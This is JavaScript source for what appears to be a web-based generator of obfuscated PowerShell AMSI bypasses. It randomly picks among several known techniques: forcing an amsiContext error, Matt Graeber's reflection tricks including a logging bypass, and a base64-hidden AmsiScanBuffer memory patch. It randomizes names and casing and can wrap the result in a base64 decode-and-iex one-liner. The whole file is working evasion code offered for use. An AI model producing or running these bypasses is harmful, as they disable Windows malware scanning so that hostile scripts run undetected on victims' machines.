function getPayload(){
  let memvar = randomString(3 + randomInt(7));
  const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${obfuscateInt(9076)});[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$${memvar});`
  const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);`;
  const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Delegate]::CreateDelegate((\"Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
  const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType($${memvar}).GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x${randomInt(2147483647).toString(16)});`
  const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");

  switch (randomInt(5)) {
      case 0:
          return encodePayload(ForceErrer)
      case 1:
          return encodePayload(MattGRefl)
      case 2:
          return encodePayload(MattGReflLog)
      case 3:
          return encodePayload(MattGref02)
      case 4:
          return encodeRasta(RastaBuf)
  }
}
  
  
  function GeneratePS(){
     
     document.getElementById("PowerShellOut").value =  getPayload();            
  }
  
  function GenerateEncPS(){
     document.getElementById("PowerShellOut").value =  `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`           
  }
